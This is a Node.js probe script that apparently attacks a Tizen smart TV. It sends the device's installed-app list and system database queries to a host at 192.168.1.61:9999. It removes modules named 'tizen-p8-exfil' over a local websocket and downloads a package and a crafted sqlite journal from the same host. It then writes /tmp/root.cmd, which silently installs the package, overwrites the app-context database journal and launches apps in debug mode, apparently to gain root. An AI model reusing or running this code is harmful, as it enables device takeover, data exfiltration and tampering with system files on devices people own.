"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var fs = require('fs');
var net = require('net');
var http = require('http');
var crypto = require('crypto');
var HOST='192.168.1.61', PORT=9999;
var BASE='/home/owner/share/tmp/sdk_tools';
var R={ts:new Date().toISOString(), probe:'p152', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,800));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p152info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function download(url, dest, cb) {
  try {
    http.get(url, function(res) {
      if (res.statusCode !== 200) { cb('status '+res.statusCode); return; }
      var chunks=[];
      res.on('data', function(c){ chunks.push(c); });
      res.on('end', function(){ var b=Buffer.concat(chunks); try { fs.writeFileSync(dest,b); } catch(e) { cb('write err '+String(e)); return; } cb(null,b.length); });
      res.on('error', function(e){ cb('res err '+e.message); });
    }).on('error', function(e){ cb('req err '+e.message); });
  } catch(e) { cb('exc '+String(e)); }
}
function wsFrame(text) {
  var payload = new Buffer(text, 'utf8'); var len = payload.length; var header;
  if (len < 126) header = new Buffer([0x81, 0x80 | len]);
  else if (len < 65536) { header = new Buffer(4); header[0]=0x81; header[1]=0x80|126; header.writeUInt16BE(len,2); }
  else { header = new Buffer(10); header[0]=0x81; header[1]=0x80|127; header.writeUInt32BE(len,2); header.writeUInt32BE(0,6); }
  var mask = new Buffer([1,2,3,4]); var masked = new Buffer(len);
  for (var i=0;i<len;i++) masked[i]=payload[i]^mask[i%4];
  return Buffer.concat([header, mask, masked]);
}
function parseFrames(buf) {
  var out=[]; var i=0;
  while (i < buf.length) {
    if (buf.length - i < 2) break;
    var b1=buf[i], b2=buf[i+1]; var opcode=b1&0x0f, masked=(b2&0x80)>>7, len=b2&0x7f; i+=2;
    if (len===126) { if (buf.length-i<2) break; len=buf.readUInt16BE(i); i+=2; }
    else if (len===127) { if (buf.length-i<8) break; len=buf.readUInt32BE(i); i+=8; }
    var mask=null;
    if (masked) { if (buf.length-i<4) break; mask=buf.slice(i,i+4); i+=4; }
    if (buf.length-i<len) break;
    var payload=buf.slice(i,i+len); i+=len;
    if (mask) for (var j=0;j<len;j++) payload[j]^=mask[j%4];
    out.push({opcode:opcode, payload:payload.toString('utf8')});
  }
  return out;
}
function tbWS(cb) {
  try {
    var key = crypto.randomBytes(16).toString('base64');
    var req = 'GET / HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: '+key+'\r\nSec-WebSocket-Version: 13\r\n\r\n';
    var s = net.connect(8081, '127.0.0.1'); var buf = new Buffer(0); var handshaken=false; var msgs=[];
    s.on('connect', function(){ s.write(req); });
    s.on('data', function(d){
      buf = Buffer.concat([buf, d]);
      if (!handshaken) {
        var idx = buf.indexOf('\r\n\r\n');
        if (idx >= 0) { var head = buf.slice(0, idx+4).toString(); buf = buf.slice(idx+4); handshaken = head.indexOf('101') >= 0; if (!handshaken) { cb('handshake fail: '+head.slice(0,200)); s.destroy(); return; } }
      }
      if (handshaken) { var frames = parseFrames(buf); buf = new Buffer(0); for (var i=0;i<frames.length;i++) msgs.push(frames[i].payload); }
    });
    s.on('error', function(e){ cb('ws err '+e.message); });
    s.on('close', function(){ cb('ws close'); });
    return { s:s, msgs:msgs, send:function(t){ s.write(wsFrame(t)); } };
  } catch(e) { cb('ws exc '+String(e)); return null; }
}
function findModules(msgs){ for (var i=0;i<msgs.length;i++){ try{ var m=JSON.parse(msgs[i]); if (m.type===4) return m.payload; }catch(e){} } return null; }
function main(){
  postBuf('/p152start', new Buffer(JSON.stringify({ts:new Date().toISOString(), probe:'p152start'}),'utf8'));
  try {
    var info = tizen.application.getAppInfo('launcherxx.MyLauncher');
    R.results.appInfo = JSON.stringify(info);
  } catch(e) { R.results.appInfo = 'ERR '+String(e); }
  try {
    tizen.application.getAppsInfo(function(list){
      var out=[];
      for (var i=0;i<list.length;i++) out.push(list[i].id+' | '+list[i].name+' | show='+list[i].show);
      R.results.apps = out.join('\n');
    }, function(e){ R.results.apps = 'ERR '+String(e); });
  } catch(e) { R.results.apps = 'ERR '+String(e); }
  R.results.keyfilter = run('sqlite3 /opt/dbspace/.app-context.db "select rowid,* from key_filter where key=\'XF86Home\'" 2>&1',10000,2000);

  var ws = tbWS(function(err){ L('ws cb '+err); });
  if (ws) {
    setTimeout(function(){
      ws.send(JSON.stringify({type:4, payload:true}));
      setTimeout(function(){
        var found=findModules(ws.msgs);
        R.results.modules = found ? JSON.stringify(found).substring(0,8000) : 'no modules response';
        if (found && found.length) {
          var removed=[];
          for (var i=0;i<found.length;i++) {
            var full=found[i].fullName || '';
            if (full.indexOf('tizen-p8-exfil') >= 0 && full.indexOf('@p152') < 0) {
              ws.send(JSON.stringify({type:10, payload:{action:'remove', module:full}}));
              removed.push(full);
            }
          }
          R.results.removed = removed.join(', ');
          setTimeout(function(){
            ws.send(JSON.stringify({type:4, payload:true}));
            setTimeout(function(){
              var found2=findModules(ws.msgs);
              R.results.modulesAfter = found2 ? JSON.stringify(found2).substring(0,8000) : 'no modules response';
              finish();
            }, 2000);
          }, 1000);
        } else finish();
      }, 2000);
    }, 1000);
  } else finish();
}
function finish(){
  download('http://192.168.1.61:9999/launcher6.wgt', BASE+'/launcher6.wgt', function(err, len){
    R.results.download6 = err ? ('ERR '+err) : ('ok '+len);
    download('http://192.168.1.61:9999/appctx_hot_journal_launcher', BASE+'/appctx_hot_journal_launcher', function(err2, len2){
      R.results.journal = err2 ? ('ERR '+err2) : ('ok '+len2);
      if (!err && !err2) {
        var script='#!/bin/sh\nwhich pkgcmd > '+BASE+'/pkgproof6.txt 2>&1\npkgcmd -i -t wgt -p '+BASE+'/launcher6.wgt -q -G >> '+BASE+'/pkgproof6.txt 2>&1\necho rc=$? >> '+BASE+'/pkgproof6.txt\ncp '+BASE+'/appctx_hot_journal_launcher /opt/dbspace/.app-context.db-journal\necho journal_rc=$? >> '+BASE+'/journal6.txt\nmd5sum /opt/dbspace/.app-context.db-journal >> '+BASE+'/journal6.txt 2>&1\nsleep 3\nwhich app_launcher >> '+BASE+'/launcherdebug6.txt 2>&1\napp_launcher --start launcherxx.MyLauncher --web-debug >> '+BASE+'/launcherdebug6.txt 2>&1\necho rc=$? >> '+BASE+'/launcherdebug6.txt\napp_launcher --start xvvl3S1bvH.TizenBrewStandalone --web-debug >> '+BASE+'/tbdebug6.txt 2>&1\necho rc=$? >> '+BASE+'/tbdebug6.txt\n#END\n';
        try { fs.writeFileSync('/tmp/root.cmd', script); R.results.rootcmd='[written]'; } catch(e){ R.results.rootcmd='ERR '+String(e); }
        R.results.rootcmdls=run('ls -la /tmp/root.cmd; tail -3 /tmp/root.cmd 2>&1',10000,1000);
        run('sleep 10',10000,100);
        R.results.proof=run('cat '+BASE+'/pkgproof6.txt 2>&1',10000,6000);
        R.results.journalproof=run('cat '+BASE+'/journal6.txt 2>&1',10000,2000);
        R.results.debug=run('cat '+BASE+'/launcherdebug6.txt 2>&1',10000,4000);
        R.results.tbdebug=run('cat '+BASE+'/tbdebug6.txt 2>&1',10000,4000);
      }
      R.results.final='done '+new Date().toISOString();
      L('done'); postFinal(); setTimeout(postFinal,20000);
    });
  });
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
